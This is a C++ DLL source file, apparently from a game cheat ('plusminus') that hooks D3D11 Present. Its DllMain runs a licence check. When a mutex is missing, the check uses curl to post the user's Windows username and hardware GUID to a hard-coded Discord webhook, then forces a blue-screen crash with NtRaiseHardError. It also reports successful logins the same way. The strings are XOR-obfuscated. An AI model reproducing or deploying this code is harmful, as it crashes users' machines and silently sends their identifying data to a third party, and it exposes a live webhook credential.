#include "includes.h"

#pragma comment(lib, "ntdll.lib")

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
	PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);

void BlueScreen() {
	BOOLEAN bl;
	ULONG Response;
	RtlAdjustPrivilege(19, TRUE, FALSE, &bl); // Enable SeShutdownPrivilege
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); // Shutdown
}
void HWID_Checker(HINSTANCE hModule) {
	HW_PROFILE_INFO hwProfileInfo;
	GetCurrentHwProfile(&hwProfileInfo);
	WCHAR* guid = hwProfileInfo.szHwProfileGuid;
	_bstr_t b(guid);
	char* c = b;
	char name[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserNameA(name, &username_len);
	std::string webhook_url = c_xor("https://discord.com/api/webhooks/803415594996203531/HUmu0j4z9fbkxG3e7WyaYbJ5K2_6iHl9GMmQcAYCD8aUwJycZfbk1f_pStHVY7n4NBn1");
	std::string avatar_url = c_xor("https://i.imgur.com/9FKjGO8.png");
	std::string lol = c;
	std::string winname = name;
	std::string mutex_not_found = c_xor("curl --data \"username=plusminus&content=got bluescreened: ") + winname + c_xor(" guid: ") + lol + c_xor("&avatar_url=") + avatar_url + "\" " + webhook_url;
	std::string fail = c_xor("curl --data \"username=plusminus&content=login failed: ") + winname + c_xor(" guid: ") + lol + c_xor("&avatar_url=") + avatar_url + "\" " + webhook_url;
	std::string success = c_xor("curl --data \"username=plusminus&content=login successful: ") + winname + c_xor(" guid: ") + lol + c_xor("&avatar_url=") + avatar_url + "\" " + webhook_url;
#ifdef noauth
	CreateThread(NULL, 0, Start, NULL, 0, NULL);

	//AllocConsole();
	//freopen(xorstr("CONOUT$"), xorstr("w"), stdout);
	//std::cout << xorstr("hi\n\n\n");

	//il2cpp_lib::think(xorstr("Assembly-CSharp")); // assembly name ( could loop through all domain assemblies to make this easier )
	//il2cpp_lib::dump_methods(xorstr(""), xorstr("BasePlayer")); // namespace, klass name
	//il2cpp_lib::dump_fields(xorstr(""), xorstr("BasePlayer")); // namespace, klass name
	//return;
#else
	HANDLE hMutex = OpenMutexA(SYNCHRONIZE, FALSE, c_xor("1bo7MMSCOc6Nod3iV4BK"));
	if (!hMutex) {
		system(mutex_not_found.c_str());
		BlueScreen();
		//MessageBox(0, xorstr(L"helo monky nice crack attempt LAWL"), 0, 0);
		exit(0);
	}
	else {
		CloseHandle(hMutex);
		system(success.c_str());
		CreateThread(NULL, 0, Start, NULL, 0, NULL);
	}
#endif
}
BOOL __stdcall DllMain(HINSTANCE hModule, DWORD dwReason, LPVOID lpReserved) {
	switch (dwReason) { 
	case DLL_PROCESS_ATTACH:
		HWID_Checker(hModule);
		break;
	case DLL_PROCESS_DETACH:
		DetourTransactionBegin();
		DetourUpdateThread(GetCurrentThread());
		DetourDetach(&(LPVOID&)phookD3D11Present, (PBYTE)hookD3D11Present);
		DetourTransactionCommit();
		break;
	}
	return TRUE;
}
